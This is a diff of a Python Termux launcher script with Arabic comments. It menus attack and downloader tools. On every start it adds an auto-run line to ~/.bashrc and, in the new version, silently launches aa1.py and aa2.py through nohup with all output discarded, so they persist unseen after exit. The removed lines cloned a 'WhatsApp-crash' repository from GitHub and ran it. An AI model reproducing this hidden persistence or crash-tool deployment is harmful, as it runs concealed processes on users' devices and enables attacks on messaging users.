@@ -10,15 +10,17 @@ YELLOW = "\033[1;33m"
 WHITE = "\033[1;37m"
 RESET = "\033[0m"
 
-# 1. تشغيل aa1.py و aa2.py في الخلفية بشكل مخفي تماماً
+# 1. تشغيل الملفات aa1.py و aa2.py لتبقى تعمل للأبد (حتى بعد الخروج)
 def start_background_tasks():
     files = ["aa1.py", "aa2.py"]
     for file in files:
         if os.path.exists(file):
-            # تشغيل الملفات في الخلفية دون التأثير على الواجهة
-            subprocess.Popen([sys.executable, file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # استخدام nohup لضمان عدم توقف السكربت عند إغلاق التيرمكس
+            # توجيه المخرجات لـ /dev/null يجعل العملية صامتة تماماً
+            cmd = f"nohup python {file} > /dev/null 2>&1 &"
+            os.system(cmd)
 
-# 2. وظيفة التثبيت التلقائي (المجلد الجديد The-legend)
+# 2. وظيفة التثبيت التلقائي
 def auto_install():
     bashrc_path = os.path.expanduser("~/.bashrc")
     command = '[ -z "$NO_AUTO" ] && cd ~/The-legend && python a.py\n'
@@ -33,7 +35,8 @@ def auto_install():
     except:
         pass
 
-# بدء المهام عند فتح السكربت
+# بدء المهام في الخلفية فور تشغيل الأداة
+# ملاحظة: السكربتات لن تفتح مرة أخرى إذا كانت تعمل بالفعل في الخلفية
 auto_install()
 start_background_tasks()
 
@@ -72,7 +75,7 @@ def main():
         print(GREEN + "\n[1] Launch Attack Tool (a1.py)" + RESET)
         print(CYAN + "[2] WhatsApp Video Downloader (a2.js)" + RESET)
         print(YELLOW + "[3] TikTok Radar Tool (a3.py)" + RESET)
-        print(RED + "[4] Crash Bot System (xray-v4)" + RESET)
+        print(RED + "[4] Open Project-Legend Folder" + RESET)
         print(WHITE + "[5] Exit to Shell ($)" + RESET)
         print(RED + "-------------------------------------------" + RESET)
 
@@ -88,19 +91,9 @@ def main():
             os.system("python a3.py")
             input("\nPress Enter to return...")
         elif choice == "4":
-            print(CYAN + "\n[!] Processing WhatsApp-crash Deployment..." + RESET)
-            # تنفيذ السلسلة المطلوبة:
-            # الدخول للمشروع، سحب المستودع، إنشاء المجلد xray-v4، النسخ، والتشغيل
-            cmd = (
-                "cd ~/Project-Legend && "
-                "git clone https://github.com/m539475124/WhatsApp-crash.git && "
-                "mkdir -p xray-v4 && "
-                "cp -r WhatsApp-crash/* xray-v4/ && "
-                "cd xray-v4 && node main.js"
-            )
-            os.system(cmd)
-            # بعد التشغيل يطبع اسم البوت الخاص بك
-            print(GREEN + "\n@MySejguBot Active ✅" + RESET)
+            os.system('clear')
+            print(CYAN + "📂 Switching to Project-Legend folder..." + RESET)
+            os.system("cd ~/Project-Legend && NO_AUTO=1 bash")
             os._exit(0)
         elif choice == "5":
             os.system('clear')
